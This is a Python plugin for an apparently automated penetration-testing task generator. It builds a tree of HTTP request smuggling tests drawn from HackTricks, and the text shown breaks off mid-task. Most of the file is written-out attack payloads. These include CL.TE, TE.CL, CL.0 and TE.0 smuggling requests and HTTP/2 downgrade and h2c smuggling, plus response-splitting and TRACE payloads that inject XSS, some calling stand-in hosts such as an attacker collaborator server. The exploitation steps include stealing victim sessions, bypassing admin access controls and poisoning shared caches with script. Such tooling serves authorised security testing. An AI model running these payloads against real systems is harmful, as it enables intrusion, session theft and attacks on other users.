"""
HTTP Request Smuggling service plugin

Generates tasks for HTTP Request Smuggling detection and exploitation including:
- CL.TE, TE.CL, TE.TE, CL.CL, CL.0, TE.0 techniques
- HTTP/2 downgrade smuggling (H2.TE, H2.CL)
- H2C smuggling (HTTP/2 over cleartext)
- HTTP response smuggling and desync attacks
- Browser-powered desync attacks
- Connection-state exploitation

Extracted from HackTricks:
- pentesting-web/http-request-smuggling/README.md
- pentesting-web/http-request-smuggling/request-smuggling-in-http-2-downgrades.md
- pentesting-web/http-request-smuggling/browser-http-request-smuggling.md
- pentesting-web/h2c-smuggling.md
- pentesting-web/http-response-smuggling-desync.md
- pentesting-web/http-connection-request-smuggling.md
- pentesting-web/http-connection-contamination.md

Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class HTTPSmugglingPlugin(ServicePlugin):
    """HTTP Request Smuggling detection and exploitation plugin"""

    @property
    def name(self) -> str:
        return "http-smuggling"

    @property
    def default_ports(self) -> List[int]:
        return [80, 443, 8080, 8443]

    @property
    def service_names(self) -> List[str]:
        return ['http', 'https', 'http-proxy', 'https-alt']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect HTTP services for smuggling testing"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')

        # Check service name
        if any(svc in service for svc in self.service_names):
            return True

        # Check common ports
        if port in self.default_ports:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate HTTP Request Smuggling enumeration task tree"""
        version = service_info.get('version', '')
        product = service_info.get('product', '')
        is_https = port in [443, 8443] or 'https' in service_info.get('service', '').lower()
        protocol = 'https' if is_https else 'http'

        tasks = {
            'id': f'http-smuggling-{port}',
            'name': f'HTTP Request Smuggling Tests (Port {port})',
            'type': 'parent',
            'children': []
        }

        # PHASE 1: Reconnaissance
        recon_tasks = {
            'id': f'smuggling-recon-{port}',
            'name': 'Smuggling Reconnaissance',
            'type': 'parent',
            'children': []
        }

        # Task 1: HTTP/2 Detection
        recon_tasks['children'].append({
            'id': f'http2-detection-{port}',
            'name': 'Detect HTTP/2 Support',
            'type': 'command',
            'metadata': {
                'command': f'curl -v --http2 {protocol}://{target}:{port}/',
                'description': 'Check if server supports HTTP/2 (needed for H2.TE/H2.CL attacks)',
                'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'RECON'],
                'flag_explanations': {
                    '-v': 'Verbose output (shows protocol negotiation)',
                    '--http2': 'Attempt HTTP/2 connection via ALPN'
                },
                'success_indicators': [
                    '* Using HTTP2, server supports multiplexing',
                    'HTTP/2 200 in response'
                ],
                'failure_indicators': [
                    'HTTP/1.1 in response (no HTTP/2 support)',
                    'Connection refused',
                    'SSL handshake failed'
                ],
                'next_steps': [
                    'If HTTP/2 supported: test H2.TE and H2.CL techniques',
                    'If HTTP/1.1 only: test CL.TE, TE.CL, TE.TE',
                    'Check for HTTP/2 downgrade proxy (front-end HTTP/2, backend HTTP/1.1)'
                ],
                'alternatives': [
                    f'openssl s_client -alpn h2 -connect {target}:{port}',
                    f'nmap --script http2-support -p {port} {target}'
                ],
                'notes': 'ALPN negotiation shows protocol. Look for "* ALPN: server accepted h2"'
            }
        })

        # Task 2: Proxy Detection
        recon_tasks['children'].append({
            'id': f'proxy-detection-{port}',
            'name': 'Identify Reverse Proxy/Load Balancer',
            'type': 'command',
            'metadata': {
                'command': f'curl -I {protocol}://{target}:{port}/',
                'description': 'Identify front-end proxies (desync requires proxy/backend architecture)',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'RECON'],
                'flag_explanations': {
                    '-I': 'Fetch headers only (HEAD request)'
                },
                'success_indicators': [
                    'Server: nginx, Apache, HAProxy, Traefik, AWS ELB headers',
                    'Via: header present (indicates proxy)',
                    'X-Cache, X-Proxy headers',
                    'X-Forwarded-For header presence'
                ],
                'failure_indicators': [
                    'Direct backend server exposure (no proxy headers)',
                    'Connection refused'
                ],
                'next_steps': [
                    'Identify proxy type (nginx, Apache, HAProxy, AWS ALB)',
                    'Check for connection reuse (Connection: keep-alive)',
                    'Test for first-request routing vulnerabilities'
                ],
                'alternatives': [
                    f'Manual: telnet {target} {port}, then GET / HTTP/1.1',
                    f'nmap --script http-headers -p {port} {target}'
                ],
                'notes': 'Key indicators: Server header mismatch between requests, Via header, X-Forwarded headers'
            }
        })

        # Task 3: Timing Baseline
        recon_tasks['children'].append({
            'id': f'timing-baseline-{port}',
            'name': 'Establish Timing Baseline',
            'type': 'manual',
            'metadata': {
                'description': 'Measure normal response times (CL.TE/TE.CL detection uses timing)',
                'tags': ['OSCP:HIGH', 'MANUAL', 'RECON'],
                'notes': 'Send 5-10 normal requests, record average response time. Smuggling payloads causing timeouts indicate vulnerability.',
                'alternatives': [
                    f'time curl {protocol}://{target}:{port}/ (repeat 5x)',
                    f'Burp Repeater: Send request 5x, note response times'
                ],
                'next_steps': [
                    'Baseline established: proceed to CL.TE timing test',
                    'If responses <100ms: vulnerabilities easier to detect',
                    'If responses >1s: add delays to smuggling payloads'
                ]
            }
        })

        tasks['children'].append(recon_tasks)

        # PHASE 2: Classic HTTP/1.1 Smuggling
        http1_tasks = {
            'id': f'http1-smuggling-{port}',
            'name': 'HTTP/1.1 Smuggling Tests',
            'type': 'parent',
            'children': []
        }

        # Task 4: CL.TE Detection
        http1_tasks['children'].append({
            'id': f'clte-timing-{port}',
            'name': 'CL.TE Timing Detection',
            'type': 'manual',
            'metadata': {
                'description': 'Detect CL.TE vulnerability using timing technique (causes backend timeout)',
                'tags': ['OSCP:HIGH', 'MANUAL', 'ENUM'],
                'notes': '''Send this payload in Burp Repeater (disable "Update Content-Length"):

POST / HTTP/1.1
Host: {target}
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0

If response times out (>30s), backend is waiting for more chunks = CL.TE vulnerable.
Front-end uses Content-Length (4 bytes), backend uses Transfer-Encoding (waits for terminal 0).''',
                'success_indicators': [
                    'Response timeout (30+ seconds)',
                    '400 Bad Request after timeout (backend reveals server)',
                    'Connection hangs indefinitely'
                ],
                'failure_indicators': [
                    'Immediate 200/404 response',
                    'Connection closed immediately',
                    '400 Bad Request immediately (front-end rejected)'
                ],
                'next_steps': [
                    'If timeout: vulnerable to CL.TE, proceed to exploitation',
                    'If no timeout: test TE.CL variant',
                    'Try TE.TE obfuscation techniques'
                ],
                'alternatives': [
                    'Use Burp HTTP Request Smuggler extension',
                    'Use smuggler.py tool',
                    'Manual netcat with crafted request'
                ]
            }
        })

        # Task 5: TE.CL Detection
        http1_tasks['children'].append({
            'id': f'tecl-timing-{port}',
            'name': 'TE.CL Timing Detection',
            'type': 'manual',
            'metadata': {
                'description': 'Detect TE.CL vulnerability using timing technique (causes backend timeout)',
                'tags': ['OSCP:HIGH', 'MANUAL', 'ENUM'],
                'notes': '''Send this payload in Burp Repeater:

POST / HTTP/1.1
Host: {target}
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X

Front-end processes Transfer-Encoding (sees complete request at "0"), backend uses Content-Length (waits for 6 bytes, only got 3).
Timeout = TE.CL vulnerable.''',
                'success_indicators': [
                    'Response timeout (30+ seconds)',
                    'Backend waiting for remaining Content-Length bytes'
                ],
                'failure_indicators': [
                    'Immediate 200 response',
                    '400 Bad Request (malformed chunked encoding)'
                ],
                'next_steps': [
                    'If timeout: vulnerable to TE.CL, proceed to exploitation',
                    'Test TE.TE obfuscation if both CL.TE and TE.CL fail',
                    'Try CL.0 or TE.0 techniques'
                ],
                'alternatives': [
                    'Burp HTTP Request Smuggler extension',
                    'smuggler.py automation'
                ]
            }
        })

        # Task 6: TE.TE Obfuscation
        http1_tasks['children'].append({
            'id': f'tete-obfuscation-{port}',
            'name': 'TE.TE Obfuscation Testing',
            'type': 'manual',
            'metadata': {
                'description': 'Test Transfer-Encoding header obfuscation (make one parser ignore TE)',
                'tags': ['OSCP:MEDIUM', 'MANUAL', 'ENUM'],
                'notes': '''Try these obfuscations (one per request):

Transfer-Encoding: xchunked
Transfer-Encoding : chunked (space before colon)
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
 Transfer-Encoding: chunked (leading space)
X: X
Transfer-Encoding: chunked

If one parser ignores obfuscated TE, treats as CL.TE or TE.CL.''',
                'success_indicators': [
                    'Timeout with obfuscated variant',
                    '400 Bad Request revealing backend server',
                    'Different response than normal request'
                ],
                'failure_indicators': [
                    'All variants return 200 immediately',
                    '400 Bad Request on all variants'
                ],
                'next_steps': [
                    'If successful obfuscation found: exploit as CL.TE or TE.CL',
                    'Document which obfuscation bypassed front-end',
                    'Test CL.0 or TE.0 if TE.TE fails'
                ],
                'alternatives': [
                    'Burp Intruder with TE obfuscation wordlist',
                    't-reqs-http-fuzzer for grammar-based fuzzing'
                ]
            }
        })

        # Task 7: CL.0 Exploitation
        http1_tasks['children'].append({
            'id': f'cl0-test-{port}',
            'name': 'CL.0 Attack (Content-Length Ignored by Backend)',
            'type': 'manual',
            'metadata': {
                'description': 'Test if backend ignores Content-Length (treats as 0)',
                'tags': ['OSCP:MEDIUM', 'MANUAL', 'ENUM'],
                'notes': '''CL.0: Front-end parses Content-Length, backend ignores it.

Test payload:
GET /Logon HTTP/1.1
Host: {target}
Content-Length:
 7

GET /404 HTTP/1.1
X: Y

If backend ignores CL and responds immediately (e.g. forbidden path like /con on IIS), next victim request gets prepended with attacker payload.
Useful on IIS with forbidden paths: /con, /prn, /aux, /nul''',
                'success_indicators': [
                    'Immediate response (backend didnt wait for body)',
                    'Second request returns 404 (smuggled)',
                    'Works with IIS forbidden paths (/con)'
                ],
                'failure_indicators': [
                    'Timeout (backend waiting for body)',
                    '400 Bad Request'
                ],
                'next_steps': [
                    'If successful: chain with victim request capture',
                    'Test double desync (0.CL to CL.0)',
                    'Poison cache with smuggled request'
                ],
                'alternatives': [
                    'Try TE.0 variant (Transfer-Encoding ignored)',
                    'Test with different paths'
                ]
            }
        })

        # Task 8: TE.0 Exploitation
        http1_tasks['children'].append({
            'id': f'te0-test-{port}',
            'name': 'TE.0 Attack (Transfer-Encoding Ignored)',
            'type': 'manual',
            'metadata': {
                'description': 'Test TE.0 technique (backend ignores Transfer-Encoding)',
                'tags': ['OSCP:MEDIUM', 'MANUAL', 'EXPLOIT'],
                'notes': '''TE.0 payload (reported in Google Cloud):

OPTIONS / HTTP/1.1
Host: {target}
Transfer-Encoding: chunked
Connection: keep-alive

50
GET http://attacker-collab-server/ HTTP/1.1
x: X
0


Backend ignores TE, treats as complete request. Smuggled GET goes to victim.''',
                'success_indicators': [
                    'Collaborator receives request from victim',
                    'Smuggled request executed',
                    'Works on Google Cloud backends'
                ],
                'failure_indicators': [
                    'No collaborator hit',
                    '400 Bad Request'
                ],
                'next_steps': [
                    'If successful: exploit for SSRF, cache poisoning',
                    'Capture victim requests',
                    'Test on multiple endpoints'
                ],
                'alternatives': [
                    'Try CL.0 variant',
                    'Use Burp Collaborator for verification'
                ]
            }
        })

        # Task 9: Hop-by-Hop Header Smuggling
        http1_tasks['children'].append({
            'id': f'hopbyhop-smuggling-{port}',
            'name': 'Hop-by-Hop Header Smuggling',
            'type': 'manual',
            'metadata': {
                'description': 'Force proxy to delete Content-Length/Transfer-Encoding via Connection header',
                'tags': ['OSCP:LOW', 'MANUAL', 'ENUM'],
                'notes': '''Send payload:

POST / HTTP/1.1
Host: {target}
Connection: Content-Length
Content-Length: 50

GET /admin HTTP/1.1
X: X

If proxy deletes Content-Length due to Connection header, backend may miscalculate body length.
Creates artificial CL.TE or TE.CL condition.''',
                'success_indicators': [
                    'Proxy removes Content-Length header',
                    'Backend receives different length calculation',
                    'Smuggling successful'
                ],
                'failure_indicators': [
                    'Content-Length preserved',
                    '400 Bad Request'
                ],
                'next_steps': [
                    'Try Connection: Transfer-Encoding',
                    'Combine with other obfuscation techniques',
                    'Test on different endpoints'
                ],
                'alternatives': [
                    'Test with Connection: close variations',
                    'Use Burp to inspect proxy behavior'
                ]
            }
        })

        tasks['children'].append(http1_tasks)

        # PHASE 3: HTTP/2 Smuggling
        http2_tasks = {
            'id': f'http2-smuggling-{port}',
            'name': 'HTTP/2 Smuggling Tests',
            'type': 'parent',
            'children': []
        }

        # Task 10: H2.TE Detection
        http2_tasks['children'].append({
            'id': f'h2te-detection-{port}',
            'name': 'H2.TE Downgrade Smuggling',
            'type': 'manual',
            'metadata': {
                'description': 'HTTP/2 front-end trusts frame length, HTTP/1.1 backend trusts Transfer-Encoding',
                'tags': ['OSCP:MEDIUM', 'MANUAL', 'EXPLOIT'],
                'notes': '''H2.TE payload (send via Burp HTTP/2):

:method: POST
:path: /
:scheme: https
:authority: {target}
content-length: 13
transfer-encoding: chunked

5;ext=1
HELLO
0

GET /admin HTTP/1.1
Host: internal
X: X

Front-end reads 13 bytes via HTTP/2 frame, backend processes Transfer-Encoding (reads past boundary).
Smuggled GET /admin executed on victim connection.''',
                'success_indicators': [
                    'Victim receives 404 from /admin',
                    'Smuggled request visible in logs',
                    'Cache poisoning successful'
                ],
                'failure_indicators': [
                    '400 Bad Request',
                    'No HTTP/2 support',
                    'No downgrade to HTTP/1.1'
                ],
                'next_steps': [
                    'If successful: exploit for admin access bypass',
                    'Capture victim requests',
                    'Poison cache with malicious response'
                ],
                'alternatives': [
                    'Try H2.CL variant',
                    'Burp HTTP Request Smuggler extension auto-tests'
                ]
            }
        })

        # Task 11: H2.CL Detection
        http2_tasks['children'].append({
            'id': f'h2cl-detection-{port}',
            'name': 'H2.CL Downgrade Smuggling',
            'type': 'manual',
            'metadata': {
                'description': 'HTTP/2 front-end trusts frame length, HTTP/1.1 backend trusts Content-Length',
                'tags': ['OSCP:MEDIUM', 'MANUAL', 'EXPLOIT'],
                'notes': '''H2.CL payload:

:method: POST
:path: /
:authority: {target}
content-length: 10

AAAAAAAAAA
GET /admin HTTP/1.1
Host: {target}

Backend reads 10 bytes from Content-Length, ignores extra data. Smuggled request queued for victim.''',
                'success_indicators': [
                    'Smuggled request executed',
                    'Victim receives unexpected response',
                    'Works on downgrade proxies'
                ],
                'failure_indicators': [
                    'No downgrade detected',
                    'Both servers agree on length'
                ],
                'next_steps': [
                    'Exploit for access control bypass',
                    'Test different Content-Length values',
                    'Combine with cache poisoning'
                ],
                'alternatives': [
                    'Try H2.TE instead',
                    'Automate with Burp Smuggler extension'
                ]
            }
        })

        tasks['children'].append(http2_tasks)

        # PHASE 4: H2C Smuggling
        h2c_tasks = {
            'id': f'h2c-smuggling-{port}',
            'name': 'H2C Smuggling Tests',
            'type': 'parent',
            'children': []
        }

        # Task 12: H2C Upgrade Detection
        h2c_tasks['children'].append({
            'id': f'h2c-upgrade-{port}',
            'name': 'H2C Clear-Text Upgrade Test',
            'type': 'command',
            'metadata': {
                'command': f'curl -v --http2-prior-knowledge http://{target}:{port}/',
                'description': 'Test if server supports HTTP/2 over clear-text (h2c) via Upgrade',
                'tags': ['OSCP:MEDIUM', 'ENUM'],
                'flag_explanations': {
                    '--http2-prior-knowledge': 'Assume HTTP/2 support without upgrade negotiation'
                },
                'success_indicators': [
                    'HTTP/2 connection established',
                    '101 Switching Protocols response',
                    'Backend accepts h2c upgrade'
                ],
                'failure_indicators': [
                    'Connection refused',
                    '400 Bad Request',
                    'HTTP/1.1 response (no upgrade)'
                ],
                'next_steps': [
                    'If successful: test h2c smuggling with h2csmuggler',
                    'Check if proxy forwards Upgrade: h2c header',
                    'Bypass WAF by tunneling raw HTTP/2 frames'
                ],
                'alternatives': [
                    f'Manual: Send Upgrade: h2c, HTTP2-Settings headers',
                    'Use h2csmuggler.py tool'
                ],
                'notes': 'h2c bypasses TLS termination and WAF rules if proxy passes Upgrade header unchanged'
            }
        })

        # Task 13: H2C Smuggling Exploitation
        h2c_tasks['children'].append({
            'id': f'h2c-smuggle-{port}',
            'name': 'H2C Smuggling via h2csmuggler',
            'type': 'command',
            'metadata': {
                'command': f'python3 h2csmuggler.py -u http://{target}:{port} -x "GET /admin HTTP/1.1\\r\\nHost: {target}\\r\\n\\r\\n"',
                'description': 'Exploit h2c upgrade to smuggle requests through HTTP/1.1 proxy',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'AUTOMATED'],
                'flag_explanations': {
                    '-u': 'Target URL',
                    '-x': 'Smuggled request (raw HTTP/1.1 format with \\r\\n)'
                },
                'success_indicators': [
                    'Smuggled request executed',
                    'Access to /admin endpoint',
                    'Bypassed front-end restrictions'
                ],
                'failure_indicators': [
                    'Connection upgrade failed',
                    '400 Bad Request',
                    'Proxy blocks Upgrade header'
                ],
                'next_steps': [
                    'Access restricted endpoints (/admin, /internal)',
                    'Bypass authentication checks',
                    'Test on different paths'
                ],
                'alternatives': [
                    'Manual h2c upgrade with Connection: Upgrade header',
                    'Use Burp with HTTP/2 probing enabled'
                ],
                'notes': 'Vulnerable proxies: HAProxy, Traefik, Nuster. Mitigate by stripping Upgrade header (except WebSocket).'
            }
        })

        # Task 14: Vulnerable Proxy Identification
        h2c_tasks['children'].append({
            'id': f'h2c-proxy-id-{port}',
            'name': 'Identify H2C-Vulnerable Proxies',
            'type': 'manual',
            'metadata': {
                'description': 'Check if proxy inherently forwards Upgrade/Connection headers',
                'tags': ['OSCP:MEDIUM', 'RECON'],
                'notes': '''Inherently vulnerable (forward Upgrade headers):
- HAProxy
- Traefik
- Nuster

Potentially vulnerable (if misconfigured):
- AWS ALB/CLB
- NGINX
- Apache
- Squid
- Varnish
- Kong
- Envoy

Test by sending:
GET / HTTP/1.1
Upgrade: h2c
Connection: Upgrade, HTTP2-Settings
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA

Check response for 101 Switching Protocols.''',
                'success_indicators': [
                    '101 Switching Protocols',
                    'Backend accepts h2c',
                    'Proxy forwards Upgrade unchanged'
                ],
                'failure_indicators': [
                    'Upgrade header stripped',
                    '400 Bad Request',
                    'HTTP/1.1 response'
                ],
                'next_steps': [
                    'If vulnerable proxy: exploit h2c smuggling',
                    'Test non-compliant upgrade (without HTTP2-Settings)',
                    'Bypass authentication/WAF'
                ],
                'alternatives': [
                    'Check Server header for proxy type',
                    'Review nginx/apache config for insecure proxy_pass'
                ]
            }
        })

        tasks['children'].append(h2c_tasks)

        # PHASE 5: Response Smuggling
        response_tasks = {
            'id': f'response-smuggling-{port}',
            'name': 'HTTP Response Smuggling',
            'type': 'parent',
            'children': []
        }

        # Task 15: Response Queue Desync
        response_tasks['children'].append({
            'id': f'response-desync-{port}',
            'name': 'Response Queue Desynchronization',
            'type': 'manual',
            'metadata': {
                'description': 'Desync response queue by sending 2 complete requests (not 1.5)',
                'tags': ['OSCP:HIGH', 'MANUAL', 'EXPLOIT'],
                'notes': '''Response smuggling differs from request smuggling:
- Send 2 COMPLETE requests (not 1.5)
- Goal: desync response queue, not poison request

Payload:
POST / HTTP/1.1
Host: {target}
Content-Length: 200
Transfer-Encoding: chunked

0

POST /slow-endpoint HTTP/1.1
Host: {target}
Content-Length: 10

POST /search?q=ATTACKER_PAYLOAD HTTP/1.1
Host: {target}

Victim request arrives while /slow-endpoint processes. Response to smuggled POST goes to victim, attacker receives victim response.''',
                'success_indicators': [
                    'Victim receives attacker-controlled response',
                    'Attacker receives victim response (cookies, session)',
                    'Response queue desynchronized'
                ],
                'failure_indicators': [
                    'Responses stay synchronized',
                    'Smuggled request rejected',
                    'No timing window available'
                ],
                'next_steps': [
                    'Steal victim cookies/sessions',
                    'Inject XSS in victim response',
                    'Poison cache with malicious response'
                ],
                'alternatives': [
                    'Use HEAD request for response splitting',
                    'Chain with TRACE method'
                ]
            }
        })

        # Task 16: HEAD-Based Response Splitting
        response_tasks['children'].append({
            'id': f'head-response-split-{port}',
            'name': 'HEAD-Based Response Splitting',
            'type': 'manual',
            'metadata': {
                'description': 'Abuse HEAD response (Content-Length but no body) to inject full HTTP response',
                'tags': ['OSCP:HIGH', 'MANUAL', 'EXPLOIT'],
                'notes': '''HEAD response contains Content-Length but no body. Inject response body containing complete HTTP response:

Smuggled payload:
0

HEAD /endpoint HTTP/1.1
Host: {target}

POST /reflect?param=PADDING HTTP/1.1
Host: {target}
Content-Length: 200

PADDINGXXXXXXXXXXXXXXXHTTP/1.1 200 OK
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 44

<script>alert("Response Splitting")</script>

Victim receives HEAD response with Content-Length pointing to injected malicious response.''',
                'success_indicators': [
                    'Injected response served to victim',
                    'XSS executed in victim browser',
                    'Cache poisoned with malicious response'
                ],
                'failure_indicators': [
                    'HEAD response rejected',
                    'Content-Length mismatch',
                    'Injected response not delivered'
                ],
                'next_steps': [
                    'Poison cache with persistent XSS',
                    'Steal credentials via injected login form',
                    'Test on cacheable resources (/static/js/)'
                ],
                'alternatives': [
                    'Use TRACE method for reflection',
                    'Chain with web cache deception'
                ]
            }
        })

        # Task 17: TRACE Method Exploitation
        response_tasks['children'].append({
            'id': f'trace-desync-{port}',
            'name': 'TRACE Method Desync Attack',
            'type': 'manual',
            'metadata': {
                'description': 'Abuse TRACE method to reflect headers in response body',
                'tags': ['OSCP:MEDIUM', 'MANUAL', 'EXPLOIT'],
                'notes': '''Check if TRACE enabled:
curl -X TRACE {protocol}://{target}:{port}/

TRACE reflects all headers in response body:
TRACE / HTTP/1.1
Host: {target}
XSS: <script>alert(1)</script>

Response:
HTTP/1.1 200 OK
Content-Type: message/http

TRACE / HTTP/1.1
Host: {target}
XSS: <script>alert(1)</script>

Chain with HEAD + TRACE for cache poisoning.''',
                'success_indicators': [
                    'TRACE method enabled',
                    'Headers reflected in response body',
                    'Content-Type: message/http'
                ],
                'failure_indicators': [
                    '405 Method Not Allowed',
                    'TRACE disabled',
                    'Reflection blocked'
                ],
                'next_steps': [
                    'Chain HEAD + TRACE for response splitting',
                    'Inject XSS via reflected headers',
                    'Poison cached JavaScript files'
                ],
                'alternatives': [
                    'Try OPTIONS method if TRACE disabled',
                    'Use HTTP Request Smuggling for TRACE bypass'
                ]
            }
        })

        tasks['children'].append(response_tasks)

        # PHASE 6: Connection-State Attacks
        connection_tasks = {
            'id': f'connection-state-{port}',
            'name': 'Connection-State Exploitation',
            'type': 'parent',
            'children': []
        }

        # Task 18: First-Request Routing
        connection_tasks['children'].append({
            'id': f'first-request-routing-{port}',
            'name': 'First-Request Routing Exploitation',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit proxies that route based only on first request Host header',
                'tags': ['OSCP:HIGH', 'MANUAL', 'EXPLOIT'],
                'notes': '''Many proxies route to backend based on FIRST request only. Subsequent requests reuse connection regardless of Host header.

Payload (send on same connection):
GET / HTTP/1.1
Host: allowed-external.com
Connection: keep-alive

GET /admin HTTP/1.1
Host: internal-only.local
Connection: keep-alive

Second request routed to internal host despite proxy whitelist.
Use Burp "Send group in sequence (single connection)".''',
                'success_indicators': [
                    'Internal host accessible',
                    'Admin panel reached',
                    'Access control bypassed'
                ],
                'failure_indicators': [
                    '403 Forbidden on second request',
                    'Connection closed between requests',
                    'Host header revalidated'
                ],
                'next_steps': [
                    'Access internal virtual hosts',
                    'Bypass IP whitelisting',
                    'Test password reset poisoning'
                ],
                'alternatives': [
                    'Test HTTP/2 connection coalescing',
                    'Use Turbo Intruder with requestsPerConnection=2'
                ],
                'notes': 'Vulnerable proxies: AWS ALB (patched 2022), many custom reverse proxies. Burp: HTTP Request Smuggler â†’ Connection-state probe'
            }
        })

        # Task 19: HTTP/2 Connection Coalescing
        connection_tasks['children'].append({
            'id': f'http2-coalescing-{port}',
            'name': 'HTTP/2 Connection Coalescing Abuse',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit browser HTTP/2 coalescing to access internal hosts on shared TLS cert',
                'tags': ['OSCP:MEDIUM', 'MANUAL', 'EXPLOIT'],
                'notes': '''Browsers coalesce HTTP/2 requests if cert, IP, ALPN match. If proxy validates first request only, subsequent coalesced requests inherit authorization.

Attack scenario:
1. Attacker controls evil.com (same CDN/IP as internal.company.com)
2. Victim visits evil.com (establishes HTTP/2)
3. evil.com embeds: <img src="https://internal.company.com/admin">
4. Browser reuses HTTP/2 connection (coalescing)
5. If CDN validates first request only: internal host exposed

Requires:
- Wildcard cert (*.company.com)
- Shared IP/CDN edge
- First-request validation flaw''',
                'success_indicators': [
                    'Internal host accessible via coalescing',
                    'Browser reused TLS connection',
                    'Access control bypassed'
                ],
                'failure_indicators': [
                    'Host revalidated per request',
                    'Different IPs prevent coalescing',
                    'Separate certs per host'
                ],
                'next_steps': [
                    'Access internal APIs',
                    'Chain with CSRF for privilege escalation',
                    'Test cross-tenant isolation'
                ],
                'alternatives': [
                    'Test HTTP/3 coalescing (relaxed IP match)',
                    'Use Burp HTTP/2 Smuggler insertion point'
                ],
                'notes': 'CVEs: CVE-2024-2470 (Envoy), CVE-2023-39852 (Apache Traffic Server). Mitigate: revalidate :authority per request.'
            }
        })

        # Task 20: Connection Contamination
        connection_tasks['children'].append({
            'id': f'connection-contamination-{port}',
            'name': 'HTTP/3 Connection Contamination',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit HTTP/3 connection sharing across different domains (wildcard cert)',
                'tags': ['OSCP:LOW', 'MANUAL', 'EXPLOIT'],
                'notes': '''HTTP/3 relaxes IP match requirement for coalescing. With wildcard cert (*.example.com), requests to different subdomains share connection.

If proxy uses first-request routing + wildcard cert:
- wordpress.example.com and secure.example.com share connection
- Attacker visits wordpress.example.com (vulnerable to XSS)
- Browser coalesces request to secure.example.com
- secure.example.com traffic processed by WordPress backend
- XSS executes in secure.example.com context

Test with:
fetch("//sub1.example.com/", {mode: "no-cors"}).then(() => {
  fetch("//sub2.example.com/admin", {mode: "no-cors"})
})

Check Chrome Network tab for reused connection.''',
                'success_indicators': [
                    'Connection reused across subdomains',
                    'Wrong backend processes request',
                    'XSS executes in secure context'
                ],
                'failure_indicators': [
                    'Separate connections per subdomain',
                    'No wildcard cert',
                    'Backend routing correct'
                ],
                'next_steps': [
                    'Exploit XSS in low-security subdomain',
                    'Access high-security endpoints via coalescing',
                    'Test all subdomains on wildcard cert'
                ],
                'alternatives': [
                    'Test HTTP/2 coalescing first',
                    'Use Wireshark to observe connection reuse'
                ],
                'notes': 'Requires: wildcard cert + first-request routing. Rare but high impact. Source: https://portswigger.net/research/http-3-connection-contamination'
            }
        })

        tasks['children'].append(connection_tasks)

        # PHASE 7: Browser-Powered Desync
        browser_tasks = {
            'id': f'browser-desync-{port}',
            'name': 'Browser-Powered Desync Attacks',
            'type': 'parent',
            'children': []
        }

        # Task 21: Client-Side Desync Detection
        browser_tasks['children'].append({
            'id': f'client-desync-detect-{port}',
            'name': 'Client-Side Desync Detection',
            'type': 'manual',
            'metadata': {
                'description': 'Detect browser-exploitable request smuggling (cross-origin constraints)',
                'tags': ['OSCP:MEDIUM', 'MANUAL', 'ENUM'],
                'notes': '''Browser desync constraints:
- Only headers/syntax browser can send cross-origin
- No custom headers (X-Custom-Header: value)
- No TE obfuscation tricks (browser normalizes)
- Focus: path confusion, query injection, form POST body

Detection:
1. Test if server desync exists (use methods above)
2. Check if exploitable via fetch/form submission
3. Look for reflected/cached endpoints

Useful primitives:
- POST with form-encoded body
- Path traversal in URL
- Query string manipulation

Impact requires: cache poisoning, header leakage, or FE control bypass.''',
                'success_indicators': [
                    'Desync exploitable via browser fetch()',
                    'No custom headers required',
                    'Cache poisoning possible'
                ],
                'failure_indicators': [
                    'Requires header obfuscation',
                    'Not exploitable cross-origin',
                    'No reflection/cache endpoints'
                ],
                'next_steps': [
                    'Craft browser-compatible smuggling payload',
                    'Test cache poisoning with fetch()',
                    'Leak front-end injected headers'
                ],
                'alternatives': [
                    'Test connection-state attacks (no smuggling)',
                    'Focus on HTTP/2 coalescing'
                ],
                'notes': 'See: https://portswigger.net/research/browser-powered-desync-attacks and https://portswigger.net/web-security/request-smuggling/browser/client-side-desync'
            }
        })

        # Task 22: Cache Poisoning via Browser
        browser_tasks['children'].append({
            'id': f'browser-cache-poison-{port}',
            'name': 'Browser-Powered Cache Poisoning',
            'type': 'manual',
            'metadata': {
                'description': 'Poison shared cache via browser desync (persistent XSS for all users)',
                'tags': ['OSCP:HIGH', 'MANUAL', 'EXPLOIT'],
                'notes': '''Chain browser desync with cache poisoning:

1. Find desync exploitable via browser (no custom headers)
2. Identify cached resource (/static/js/main.js)
3. Smuggle request that returns XSS as cached resource

Example:
fetch("https://target.com/", {
  method: "POST",
  body: "0\\r\\n\\r\\nGET /static/js/main.js HTTP/1.1\\r\\nHost: target.com\\r\\n\\r\\n"
}).then(() => {
  fetch("https://target.com/reflect?xss=<script>alert(document.domain)</script>")
})

If /static/js/main.js cached with XSS response, all users get XSS when loading page.''',
                'success_indicators': [
                    'Cached resource poisoned',
                    'XSS persists across users',
                    'Cache-Control headers confirm caching'
                ],
                'failure_indicators': [
                    'Cache not poisoned',
                    'Desync not exploitable via browser',
                    'No cacheable resources'
                ],
                'next_steps': [
                    'Expand attack to other cached resources',
                    'Test cache duration (Cache-Control: max-age)',
                    'Chain with account takeover'
                ],
                'alternatives': [
                    'Use connection-state for cache poisoning',
                    'Test web cache deception instead'
                ]
            }
        })

        tasks['children'].append(browser_tasks)

        # PHASE 8: Exploitation Techniques
        exploit_tasks = {
            'id': f'smuggling-exploitation-{port}',
            'name': 'Request Smuggling Exploitation',
            'type': 'parent',
            'children': []
        }

        # Task 23: Bypass Front-End Security
        exploit_tasks['children'].append({
            'id': f'bypass-frontend-{port}',
            'name': 'Bypass Front-End Access Controls',
            'type': 'manual',
            'metadata': {
                'description': 'Use smuggling to access restricted paths (/admin) blocked by proxy',
                'tags': ['OSCP:HIGH', 'MANUAL', 'EXPLOIT'],
